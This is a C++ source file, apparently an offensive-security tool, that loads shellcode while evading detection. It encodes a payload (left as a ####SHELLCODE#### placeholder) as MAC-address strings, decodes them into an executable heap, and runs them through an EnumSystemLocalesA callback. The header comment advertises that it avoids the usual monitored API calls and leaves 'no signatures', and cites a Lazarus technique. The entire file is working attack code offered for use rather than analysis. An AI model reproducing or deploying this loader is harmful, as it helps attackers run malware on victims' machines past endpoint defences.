/**
Author: Thomas X Meng
MACs Process Injection code, only one API call to EnumSystemLocalesA required. 
No virtual memory allocation, no permission settings, no CreateThread, no WriteProcessMemory
No UuidFromStringA, no RPCRT4.dll, no signatures
reference: NCC Group, 
https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/
**/
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <cstdio>
#include <cstring>
#include <cstdlib>


void customMacFromString(const char* macStr, unsigned char* bytes) {
    int data[6]; // MAC addresses have 6 bytes
    sscanf(macStr, "%02x-%02x-%02x-%02x-%02x-%02x",
           &data[0], &data[1], &data[2], &data[3], &data[4], &data[5]);

    for (int i = 0; i < 6; ++i) {
        bytes[i] = static_cast<unsigned char>(data[i]);
    }
}


void bytesToMacString(const unsigned char* bytes, char* macString) {
    sprintf(macString,
            "%02X-%02X-%02X-%02X-%02X-%02X",
            bytes[0], bytes[1], bytes[2], 
            bytes[3], bytes[4], bytes[5]);
}


void convertToMacAddresses(unsigned char *magiccode, int magiccodeLength, char macs[][18]) {
    int macIndex = 0;
    for (int i = 0; i < magiccodeLength; i += 6) { // Iterate in 6-byte increments
        bytesToMacString(magiccode + i, macs[macIndex++]);
    }
}


unsigned char magiccode[] = ####SHELLCODE####;


int main(int argc, char *argv[]) {
    
    int magiccodeLength = sizeof(magiccode);
    // Calculate the number of MAC addresses needed
    int numMacs = (magiccodeLength + 5) / 6; // Each MAC address is 6 bytes long

    // Allocate memory for MAC address strings
    char(*macs)[18] = new char[numMacs][18]; // Each MAC address string is 17 characters plus null terminator

    // Convert magiccode to UUIDs
    convertToMacAddresses(magiccode, magiccodeLength, macs);

    for (int i = 0; i < numMacs; i++) {
        //only print first few lines:
        if (i < 10) {
            printf("%s\n", macs[i]);
        } else {
            break;
        }

        // printf("%s\n", macs[i]);
    }


    // Memory allocation for execution, adjusting for MAC address size
    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* ha = HeapAlloc(hc, 0, numMacs * 6); // Each MAC address is 6 bytes
    unsigned char* hptr = (unsigned char*)ha;

    // Convert MAC addresses back and copy them to the heap
    for (int i = 0; i < numMacs; i++) {
        unsigned char bytes[6]; // MAC addresses are 6 bytes
        customMacFromString(macs[i], bytes);
        memcpy(hptr + (i * 6), bytes, 6); // Copy 6 bytes for each MAC address
    }

    // Execute the magiccode
    EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
    printf("[+] Magiccode executed\n");

    // Cleanup
    CloseHandle(ha);
    delete[] macs;
    Sleep(5000);
    // Terminate the process
    ExitProcess(0);

    return 0;
}
